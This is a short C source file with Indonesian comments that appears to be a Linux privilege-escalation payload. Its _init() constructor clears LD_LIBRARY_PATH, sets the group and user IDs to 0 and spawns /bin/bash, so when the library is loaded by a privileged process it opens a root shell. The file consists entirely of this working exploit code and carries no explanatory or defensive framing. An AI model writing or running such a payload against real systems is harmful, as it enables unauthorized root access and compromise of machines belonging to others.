#include <stdio.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_LIBRARY_PATH"); // Membersihkan variabel untuk menghindari masalah
    setgid(0); // Set GID ke root
    setuid(0); // Set UID ke root
    system("/bin/bash"); // Dapatkan shell root
}

